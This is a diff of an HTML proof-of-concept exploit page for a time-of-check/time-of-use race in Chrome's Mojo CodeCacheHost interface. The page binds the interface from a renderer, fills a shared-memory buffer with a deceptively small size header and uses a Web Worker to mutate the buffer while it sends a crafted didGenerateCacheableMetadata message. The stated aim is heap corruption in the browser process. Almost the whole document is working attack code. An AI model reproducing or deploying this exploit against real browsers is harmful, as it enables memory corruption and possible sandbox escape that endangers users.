@@ -4,49 +4,49 @@
     <title>CodeCacheHost BigBuffer TOCTOU</title>
 </head>
 <body>
-    <h1>CodeCacheHost Heap Overflow</h1>
-    <button id="pwn">Trigger Memory Corruption</button>
+    <h1>Chrome Windows TOCTOU Trigger</h1>
+    <button id="pwn">Trigger Heap Corruption</button>
 
-    <script type="module">
-        // Import the pointers from your dumped bindings
-        import { CodeCacheHostPtr, CodeCacheType } from './code_cache.mojom.js';
+    <!-- Load the patched bindings -->
+    <script src="code_cache.mojom.js"></script>
 
+    <script>
         async function pwnBrowser() {
             console.log("[*] Initializing Mojo connections...");
 
-            // 1. Bind to the Browser Process Interface
+            // 1. Grab the interface from the namespace your file created
+            const CodeCacheHostPtr = blink.mojom.CodeCacheHostPtr;
+            const CodeCacheType = blink.mojom.CodeCacheType;
+
+            // 2. Bind to the Browser Process Interface
             const codeCacheHost = new CodeCacheHostPtr();
             Mojo.bindInterface('blink.mojom.CodeCacheHost', 
                                mojo.makeRequest(codeCacheHost).handle);
 
-            // 2. Allocate the Malicious Shared Memory
-            // We use 100KB to guarantee it triggers the Shared Memory path in BigBuffer
+            // 3. Allocate the Malicious Shared Memory (100KB)
             const bufferSize = 100 * 1024;
             const sharedBuffer = Mojo.createSharedBuffer(bufferSize);
-            
-            // Map the buffer into our Renderer process so we can write to it
             const mapping = sharedBuffer.handle.mapBuffer(0, bufferSize);
             const view = new DataView(mapping.buffer);
 
-            // 3. Write a "Safe" Dummy Header
-            // We write a legitimate size so the initial Browser checks pass.
-            const SAFE_SIZE = 0x50;
-            view.setUint32(0, 0x13371337, true); // Dummy Magic Number
-            view.setUint32(4, SAFE_SIZE, true);  // The Target Size Field
+            // 4. Write a "Safe" Dummy Header (Size = 0x50)
+            view.setUint32(0, 0x13371337, true); 
+            view.setUint32(4, 0x50, true);  
 
-            console.log("[*] Shared Memory initialized. Starting mutator thread...");
+            console.log("[*] Shared Memory ready. Spawning mutator...");
 
-            // 4. Spawn the Mutator Worker
-            // We pass the raw memory buffer to a Web Worker to race the Browser process
+            // 5. Spawn the Mutator Worker to race the Browser
             const mutator = new Worker('mutator.js');
             mutator.postMessage({ buffer: mapping.buffer }, [mapping.buffer]);
 
-            // 5. Construct the Mojo Parameters
-            const cacheType = CodeCacheType.kJavascript;
-            const url = { url: "https://victim.com/script.js" };
-            const responseTime = { internalValue: 0 };
+            // 6. Construct the Raw Structs manually (since we deleted the deps)
+            // url.mojom.Url
+            const fakeUrl = { url: "https://victim.com/" }; 
             
-            // Force the BigBuffer to use the Shared Memory union
+            // mojo_base.mojom.Time
+            const fakeTime = { internalValue: 0n }; 
+            
+            // mojo_base.mojom.BigBuffer (Union)
             const bigBufferData = {
                 sharedMemory: {
                     bufferHandle: sharedBuffer.handle,
@@ -54,19 +54,17 @@
                 }
             };
 
-            console.log("[*] Sending malicious IPC payload...");
+            console.log("[*] Firing IPC Message...");
 
-            // 6. FIRE THE IPC MESSAGE
-            // This sends the handle to the Browser process. 
-            // The Browser will read our SAFE_SIZE, allocate memory, and then...
+            // 7. FIRE THE IPC MESSAGE
             codeCacheHost.didGenerateCacheableMetadata(
-                cacheType, 
-                url, 
-                responseTime, 
+                CodeCacheType.kJavascript, 
+                fakeUrl, 
+                fakeTime, 
                 bigBufferData
             );
 
-            console.log("[+] Payload sent. If the race is won, the Browser process will SIGSEGV.");
+            console.log("[+] IPC sent! If the race hits, the browser process will crash.");
         }
 
         document.getElementById('pwn').onclick = pwnBrowser;
